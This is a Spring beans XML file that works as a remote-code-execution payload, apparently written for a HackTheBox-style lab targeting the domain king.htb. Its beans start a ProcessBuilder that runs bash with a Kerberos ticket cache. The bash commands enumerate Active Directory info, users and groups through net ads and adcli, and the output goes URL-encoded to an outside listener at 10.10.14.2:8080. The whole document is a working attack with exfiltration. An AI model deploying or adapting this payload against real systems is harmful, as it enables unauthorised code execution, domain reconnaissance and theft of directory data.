<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value><![CDATA[
export KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd;
NET_INFO=$(timeout 10 net ads info -S 172.16.1.1 2>&1);
NET_USERS=$(timeout 15 net ads user -S 172.16.1.1 -k 2>&1 | head -40);
NET_GROUPS=$(timeout 15 net ads group -S 172.16.1.1 -k 2>&1 | head -40);
ADCLI=$(timeout 10 adcli info king.htb -D 172.16.1.1 2>&1);
echo "=INFO=$NET_INFO=USERS=$NET_USERS=GROUPS=$NET_GROUPS=ADCLI=$ADCLI"
]]></value>
            </list>
        </constructor-arg>
    </bean>
    <bean id="proc" factory-bean="pb" factory-method="start"/>
    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
          factory-method="copyToByteArray">
        <constructor-arg ref="procOut"/>
    </bean>
    <bean id="outStr" class="java.lang.String">
        <constructor-arg ref="outBytes"/>
    </bean>
    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
        <constructor-arg value="#{'http://10.10.14.2:8080/netads?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
    </bean>
    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
</beans>
